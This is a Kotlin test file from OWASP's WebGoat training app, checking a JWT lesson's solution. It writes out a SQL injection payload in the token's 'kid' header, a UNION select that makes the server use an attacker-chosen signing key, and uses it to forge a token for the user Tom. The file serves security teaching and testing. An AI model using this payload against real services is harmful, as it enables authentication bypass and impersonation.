/*
 * SPDX-FileCopyrightText: Copyright © 2018 WebGoat authors
 * SPDX-License-Identifier: GPL-2.0-or-later
 */
package org.owasp.webgoat.lessons.jwt.claimmisuse

import io.jsonwebtoken.Jwts
import io.jsonwebtoken.SignatureAlgorithm
import org.hamcrest.CoreMatchers
import org.hamcrest.Matchers.`is`
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.owasp.webgoat.container.plugins.LessonTest
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.status
import org.springframework.test.web.servlet.setup.MockMvcBuilders
import java.util.Date
import java.util.concurrent.TimeUnit

class JWTHeaderKIDEndpointTest : LessonTest() {
    companion object {
        private const val TOKEN_JERRY =
            "eyJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTNTEyIn0.eyJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImVtYWlsIjoiamVycnlAd2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IkplcnJ5In0.xBc5FFwaOcuxjdr_VJ16n8Jb7vScuaZulNTl66F2MWF1aBe47QsUosvbjWGORNcMPiPNwnMu1Yb0WZVNrp2ZXA"
    }

    @BeforeEach
    fun setup() {
        mockMvc = MockMvcBuilders.webAppContextSetup(wac).build()
    }

    @Test
    fun solveAssignment() {
        val key = "deletingTom"
        val claims = mapOf("username" to "Tom")
        val token =
            Jwts
                .builder()
                .setHeaderParam(
                    "kid",
                    "hacked' UNION select '$key' from INFORMATION_SCHEMA.SYSTEM_USERS --",
                ).setIssuedAt(Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10)))
                .setClaims(claims)
                .signWith(SignatureAlgorithm.HS512, key)
                .compact()
        mockMvc
            .perform(MockMvcRequestBuilders.post("/JWT/kid/delete").param("token", token).content(""))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.lessonCompleted", `is`(true)))
    }

    @Test
    fun withJerrysKeyShouldNotSolveAssignment() {
        mockMvc
            .perform(
                MockMvcRequestBuilders.post("/JWT/kid/delete").param("token", TOKEN_JERRY).content(""),
            ).andExpect(status().isOk())
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("jwt-final-jerry-account"))),
            )
    }

    @Test
    fun shouldNotBeAbleToBypassWithSimpleToken() {
        mockMvc
            .perform(
                MockMvcRequestBuilders
                    .post("/JWT/kid/delete")
                    .param("token", ".eyJ1c2VybmFtZSI6IlRvbSJ9.")
                    .content(""),
            ).andExpect(status().isOk())
            .andExpect(
                jsonPath("$.feedback", CoreMatchers.`is`(messages.getMessage("jwt-invalid-token"))),
            )
    }
}
